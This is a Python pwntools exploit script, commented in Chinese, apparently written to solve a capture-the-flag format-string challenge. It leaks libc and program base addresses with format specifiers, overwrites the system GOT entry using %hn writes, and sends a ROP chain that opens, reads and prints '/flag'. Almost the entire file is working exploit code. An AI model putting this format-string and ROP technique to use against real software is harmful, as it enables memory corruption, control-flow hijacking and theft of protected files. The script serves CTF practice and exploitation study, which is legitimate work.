#!/usr/bin/env python

# 绝对非预期了，直接ROP

from pwn import *

context(arch="amd64", os="linux")
p = process("/challenge/fmt-str-level1.1")
print("pidof fmt-str-level1.1:", proc.pidof(p)[0])
p.interactive()


# 利用rsi（第1个参数）获取buf地址
# 利用rcx（第3个参数）寄存器中的地址（libc_2.31.so:__read+12）计算libc加载地址
# 利用栈中的_start地址（第16个参数）计算加载地址

libc_offset = 0x10dfd2
libc_base = 0xffffffffffffffff
proc_offset =0x10e0
proc_base = 0xffffffffffffffff

buf_addr = 0xffffffffffffffff
# 通过修改system的got表进入ROP链

got_offset = 0x4020 

open_offset = 0x10dce0
read_offset = 0x10dfc0
puts_offset = 0x84420


# ROPgadget libc
pop_rdi_offset = 0x23b6a # pop rdi ; ret
pop_rsi_offset = 0x2601f # pop rsi ; ret
pop_rdx_offset = 0x142c92 # pop rdx ; ret


# 获取返回地址，计算程序got表地址
# 计算libc加载地址
payload = b"%1$p\n%3$p\n%16$p\n"
p.send(payload)
lines = p.recvlines(numlines=3)
buf_addr = int(lines[0], 16)
libc_base = int(lines[1], 16) - libc_offset
proc_base = int(lines[2], 16) - proc_offset
print("libc_base:", hex(libc_base))
print("proc_base:", hex(proc_base))
print("buf addr:", hex(buf_addr))


# 修改got表使system调用进入ROP链
got_addr = proc_base + got_offset # system got表地址
new_got = libc_base + pop_rdi_offset # 新的got表数据
print("system .plt.got:", hex(got_addr))
print("new got data:", hex(new_got))
p.clean()
# p.interactive()


len0 = 0x0
len1 = (((new_got >> 0) & 0xffff) - len0) % 0x10000
if (len1 <= 8):
    len1 += 0x10000
len0 += len1
len2 = (((new_got >> 16) & 0xffff) - len0) % 0x10000
if (len2 <= 8):
    len2 += 0x10000
len0 += len2
len3 = (((new_got >> 32) & 0xffff) - len0) % 0x10000
if (len3 <= 8):
    len3 += 0x10000
len0 += len3
len4 = (((new_got >> 48) & 0xffff) - len0) % 0x10000
if (len4 <= 8):
    len4 += 0x10000

payload = b''
payload += "%{}x%14$hn".format(len1).encode() # 依次修改两个字节
payload += "%{}x%15$hn".format(len2).encode() # 依次修改两个字节
payload += "%{}x%16$hn".format(len3).encode() # 依次修改两个字节
payload += "%{}x%17$hn".format(len4).encode() # 依次修改两个字节

payload += cyclic(0x40 - len(payload))

payload += p64(got_addr+0) # $14
payload += p64(got_addr+2) # $15
payload += p64(got_addr+4) # $16
payload += p64(got_addr+6) # $17

p.send(payload)
p.clean()
p.interactive()

# 构造ROP链

# .got.plt pop_rdi

# 栈被-8了，先pop掉没用的数据
# ret -> pop_rsi
# rsi = 0
# ret -> pop_rdi
# rdi = buf+0x70
# ret -> open
# ret -> pop_rdx
# rdx = 0x100
# ret -> pop_rsi
# rsi = buf+0x70
# ret -> pop_rdi
# rdi = 3
# ret -> read
# ret -> pop_rdi
# rdi = buf+0x70
# ret -> puts

# 100
# /flag\x00\x00\x00
payload = b''
payload += p64(pop_rsi_offset+libc_base)
payload += p64(0)
payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_addr+0x90)
payload += p64(open_offset+libc_base)
payload += p64(pop_rdx_offset+libc_base)
payload += p64(0x100)
payload += p64(pop_rsi_offset+libc_base)
payload += p64(buf_addr+0x90)
payload += p64(pop_rdi_offset+libc_base)
payload += p64(3)
payload += p64(read_offset+libc_base)
payload += p64(pop_rdi_offset+libc_base)

payload += cyclic(4)
payload += p32(100) # 进入system判断条件

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_addr+0x90)
payload += p64(puts_offset+libc_base)

payload += p64(proc_base+proc_offset) # _start

payload += b'/flag\x00\x00\x00'

p.send(payload)
p.interactive()
